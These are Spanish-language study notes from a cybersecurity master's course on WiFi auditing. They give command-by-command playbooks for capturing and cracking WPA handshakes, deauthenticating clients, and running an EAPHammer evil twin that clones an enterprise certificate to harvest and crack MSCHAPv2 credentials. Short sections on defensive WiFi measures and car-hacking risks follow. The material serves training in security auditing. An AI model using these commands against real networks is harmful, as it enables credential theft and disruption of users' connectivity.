> [!info] Ficha técnica
> **Programa:** Máster en Ciberseguridad — Evolve Academy
> **Bloque:** 09 — Redes WiFi y Hardware
> **Contenido:** Auditoría WPA/WPA2/WPA3, WiFi Enterprise (EAP), Car Hacking

---

## ① Auditoría WPA/WPA2 personal: captura de handshake

```bash
# Poner la interfaz en modo monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0 # crea wlan0mon

# Ver redes disponibles
sudo airodump-ng wlan0mon

# Fijar canal y capturar tráfico de un AP concreto
sudo airodump-ng -c <CANAL> --bssid <BSSID_AP> -w captura wlan0mon

# Forzar reconexión de un cliente para capturar el handshake
sudo aireplay-ng -0 5 -a <BSSID_AP> -c <CLIENTE_MAC> wlan0mon

# Crackear el handshake capturado
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap
```

---

## ② WPA/WPA2-Enterprise (EAP): playbook completo

### Paso 1: Preparación y reconocimiento

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0 # → wlan0mon
sudo airodump-ng --band abg wlan0mon # ver redes en 2.4 y 5 GHz
```

### Paso 2: Capturar identidades y datos del certificado

```bash
sudo airodump-ng -c <CANAL> --bssid <BSSID_AP> -w enterprise wlan0mon

# Abrir el .pcap en Wireshark y filtrar:
eap || eapol

# Buscar "EAP-Request/Identity" y "EAP-Response/Identity" → usuarios
# (formato dominio\usuario)

# Buscar "EAP-TLS/Certificate" → extraer CN/O/L/C/email de la CA y
# el servidor, necesarios para clonar el certificado en el paso 4
```

### Paso 3: Descubrir métodos EAP débiles (¿downgrade posible?)

```bash
chmod +x eap_buster.sh
./eap_buster.sh "<SSID>" "<usuario@dominio>" wlan0mon

# Interpreta qué métodos soporta: EAP-MSCHAPv2, PEAP, TTLS, GTC, MD5...
# Si soporta GTC/MD5, es objetivo perfecto para downgrade (creds débiles)
```

### Paso 4: Evil Twin con downgrade (EAPHammer)

```bash
cd /opt/eaphammer
sudo ./eaphammer --cert-wizard
# Rellenar con los campos (C, ST, L, O, OU, email, CN) extraídos del
# certificado legítimo en el paso 2

# Levantar el AP falso negociando downgrade (interfaz NO en modo monitor):
sudo ./eaphammer \
 --interface wlan1 \
 --ssid "WiFi Corp" \
 --channel 44 \
 --auth wpa-eap \
 --negotiate \
 --creds
```

### Paso 5: Forzar reconexión de clientes al Evil Twin

```bash
# Deauth dirigido a un cliente concreto
sudo aireplay-ng -0 0 -a <BSSID_AP_LEGITIMO> -c <STA_CLIENTE> wlan0mon

# Deauth broadcast a todos los clientes de ese AP
sudo aireplay-ng -0 0 -a <BSSID_AP_LEGITIMO> wlan0mon
```

### Paso 6: Crackear EAP-MSCHAPv2 capturado

```bash
# EAPHammer guarda usuario:challenge:response en ~/eaphammer/logs/...
# Formatear en hash.txt como: usuario::::challenge:response

hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt --force

# Fuerza bruta con máscara si el diccionario no basta:
hashcat -m 5500 hash.txt -a 3 ?l?l?l?l?l?l?d?d --force
```

> [!note] Diagnóstico rápido
> - Si no aparecen redes Enterprise: añade `--band a` (5GHz) en airodump-ng
> - Si el cliente rechaza la CA: revisa que has clonado exactamente los campos del certificado (CN/Issuer/Email)
> - Si es EAP-TLS con autenticación basada en certificado de cliente (sin usuario/contraseña): el vector cambia por completo — no hay hash que crackear, hace falta robar o clonar el certificado y la clave privada

---

## ③ Buenas prácticas defensivas WiFi

| Medida | Detalle |
|--------|---------|
| **WPA2/WPA3** | Contraseñas fuertes y únicas |
| **WPS** | Desactivar por completo (vulnerable a fuerza bruta rápida) |
| **Segmentación** | Red de invitados separada de la red interna corporativa |
| **Enterprise** | Exigir EAP-TLS con certificado de cliente en lugar de métodos basados en contraseña, y validar siempre el certificado del servidor RADIUS en la configuración de los dispositivos cliente |

---

## ④ Car Hacking: una línea emergente

El Car Hacking evalúa los sistemas de un vehículo conectado aplicando la misma lógica de auditoría que a cualquier red compleja: un coche moderno es una **"miniempresa conectada"** con múltiples puntos de entrada interdependientes.

| Componente | Riesgo |
|------------|--------|
| **Redes internas** | Sistemas de infoentretenimiento segmentados de sistemas críticos de conducción |
| **CAN Bus** | Red interna que controla funciones como frenado o aceleración — el acceso permite controlar funciones críticas en configuraciones vulnerables |
| **Puntos de entrada externos** | Bluetooth, puertos USB, telemática |
| **Sensores** | Radares, cámaras, sensores de presión — manipulables para provocar comportamientos peligrosos |

> [!warning] Casos reales
> Interceptación de señales de llaves electrónicas para desbloquear vehículos (BMW en Alemania), y manipulación de sensores para provocar frenadas automáticas. El impacto no es solo económico: pone en riesgo directo la vida de las personas.